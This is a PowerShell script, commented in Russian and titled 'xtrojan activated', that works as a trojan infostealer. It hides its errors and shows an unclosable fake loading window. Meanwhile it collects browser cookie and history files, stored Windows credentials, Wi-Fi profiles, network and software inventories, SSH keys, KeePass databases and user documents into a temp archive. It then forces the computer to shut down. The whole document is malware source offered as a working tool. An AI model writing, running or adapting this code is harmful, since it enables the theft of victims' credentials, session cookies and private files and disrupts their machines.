# Скрытый запуск, минимальный вывод
$ErrorActionPreference = 'SilentlyContinue'
$host.UI.RawUI.WindowTitle = "xtrojan activated"

# Создание не закрываемого окна
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "xtrojan activated"
$form.Width = 400
$form.Height = 150
$form.StartPosition = "CenterScreen"
$form.ControlBox = $false
$form.MinimizeBox = $false
$form.MaximizeBox = $false
$form.FormBorderStyle = 'FixedDialog'
$form.TopMost = $true

# Прогресс-бар
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 60)
$progressBar.Size = New-Object System.Drawing.Size(350, 30)
$progressBar.Style = 'Marquee'
$progressBar.MarqueeAnimationSpeed = 50
$form.Controls.Add($progressBar)

# Текст загрузки
$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(20, 20)
$label.Size = New-Object System.Drawing.Size(350, 30)
$label.Text = "Загрузка данных... Пожалуйста, подождите."
$label.Font = New-Object System.Drawing.Font("Arial", 10)
$form.Controls.Add($label)

# Запуск окна в отдельном потоке
$job = Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $form.ShowDialog() | Out-Null
}

# Функция сбора данных
function Collect-AllData {
    # Этап 1: Сбор системной информации
    $systemInfo = @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        InstallDate = (Get-WmiObject Win32_OperatingSystem).InstallDate
        CPU = (Get-WmiObject Win32_Processor).Name
        RAM = "{0} GB" -f [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
        GPU = (Get-WmiObject Win32_VideoController).Name
        Drives = Get-WmiObject Win32_LogicalDisk | ForEach-Object { "$($_.DeviceID) $([math]::Round($_.Size/1GB,2))GB" }
    }
    
    # Этап 2: Сбор куки из браузеров
    $cookiesData = @{}
    $browserPaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
        "$env:APPDATA\Mozilla\Firefox\Profiles"
    )
    
    foreach ($path in $browserPaths) {
        if (Test-Path $path) {
            if ($path -like "*Firefox*") {
                $firefoxProfiles = Get-ChildItem $path -Directory
                foreach ($profile in $firefoxProfiles) {
                    $cookiesPath = Join-Path $profile.FullName "cookies.sqlite"
                    if (Test-Path $cookiesPath) {
                        $cookiesData["Firefox_$($profile.Name)"] = Get-Content $cookiesPath -Raw -ErrorAction SilentlyContinue
                    }
                }
            } else {
                $cookiesData[(Split-Path $path -Leaf)] = Get-Content $path -Raw -ErrorAction SilentlyContinue
            }
        }
    }
    
    # Этап 3: Сбор истории браузеров
    $historyData = @{}
    $historyPaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    )
    
    foreach ($path in $historyPaths) {
        if (Test-Path $path) {
            $historyData[(Split-Path $path -Leaf)] = Get-Content $path -Raw -ErrorAction SilentlyContinue
        }
    }
    
    # Этап 4: Сбор паролей (если доступно)
    $credsData = @()
    try {
        $creds = cmdkey /list 2>$null
        $credsData = $creds -join "`n"
    } catch {}
    
    # Этап 5: Сбор сетевой информации
    $networkInfo = @{
        IPConfig = ipconfig /all
        ARP = arp -a
        Connections = netstat -ano
        WiFiProfiles = netsh wlan show profiles
    }
    
    # Этап 6: Сбор установленных программ
    $software = Get-WmiObject Win32_Product | Select-Object Name, Version, Vendor
    $installedApps = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
        Where-Object { $_.DisplayName } |
        Select-Object DisplayName, DisplayVersion, Publisher
    
    # Этап 7: Сбор документов пользователя
    $userDocs = @{
        Desktop = Get-ChildItem "$env:USERPROFILE\Desktop" -File | Select-Object Name, Length, LastWriteTime
        Documents = Get-ChildItem "$env:USERPROFILE\Documents" -File | Select-Object Name, Length, LastWriteTime -First 50
        Downloads = Get-ChildItem "$env:USERPROFILE\Downloads" -File | Select-Object Name, Length, LastWriteTime -First 50
    }
    
    # Этап 8: Создание архива данных
    $outputDir = "$env:TEMP\XData_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    # Сохранение всех данных
    $systemInfo | ConvertTo-Json -Depth 10 | Out-File "$outputDir\SystemInfo.json"
    $cookiesData | ConvertTo-Json -Depth 10 | Out-File "$outputDir\Cookies.json"
    $historyData | ConvertTo-Json -Depth 10 | Out-File "$outputDir\History.json"
    $credsData | Out-File "$outputDir\Credentials.txt"
    $networkInfo | ConvertTo-Json -Depth 10 | Out-File "$outputDir\NetworkInfo.json"
    $software | ConvertTo-Json -Depth 10 | Out-File "$outputDir\Software.json"
    $installedApps | ConvertTo-Json -Depth 10 | Out-File "$outputDir\InstalledApps.json"
    $userDocs | ConvertTo-Json -Depth 10 | Out-File "$outputDir\UserDocuments.json"
    
    # Дополнительно: копирование важных файлов
    $importantFiles = @(
        "$env:USERPROFILE\.ssh\*",
        "$env:USERPROFILE\*.kdbx",
        "$env:USERPROFILE\*.txt",
        "$env:USERPROFILE\*.doc",
        "$env:USERPROFILE\*.docx",
        "$env:USERPROFILE\*.xls",
        "$env:USERPROFILE\*.xlsx",
        "$env:USERPROFILE\*.pdf"
    )
    
    foreach ($pattern in $importantFiles) {
        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            Copy-Item $file.FullName -Destination "$outputDir\Files\" -Force -ErrorAction SilentlyContinue
        }
    }
    
    # Создание финального отчета
    $report = @{
        CollectionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        TotalFiles = (Get-ChildItem $outputDir -Recurse -File).Count
        TotalSize = "{0:N2} MB" -f ((Get-ChildItem $outputDir -Recurse -File | Measure-Object Length -Sum).Sum / 1MB)
        DataLocation = $outputDir
    }
    
    $report | ConvertTo-Json | Out-File "$outputDir\Report.json"
    
    return $outputDir
}

# Основной процесс
try {
    # Запуск сбора данных в фоне
    $dataJob = Start-Job -ScriptBlock ${function:Collect-AllData}
    
    # Имитация загрузки (60 секунд)
    for ($i = 1; $i -le 60; $i++) {
        Start-Sleep -Seconds 1
        
        # Проверка завершения сбора
        if ($dataJob.State -eq 'Completed') {
            break
        }
    }
    
    # Остановка анимации прогресс-бара
    $progressBar.Style = 'Continuous'
    $progressBar.Value = 100
    $label.Text = "Завершено! Выключение компьютера..."
    
    Start-Sleep -Seconds 2
    
    # Получение результатов сбора
    if ($dataJob.State -eq 'Completed') {
        $dataLocation = Receive-Job -Job $dataJob
    }
    
    # Выключение компьютера
    Stop-Job -Job $job
    Stop-Computer -Force
    
} catch {
    # При любой ошибке - выключаем
    Stop-Computer -Force
}

# Предотвращение закрытия окна
$form.Add_Closing({
    param($sender, $e)
    $e.Cancel = $true
})

# Запуск формы
$form.ShowDialog()
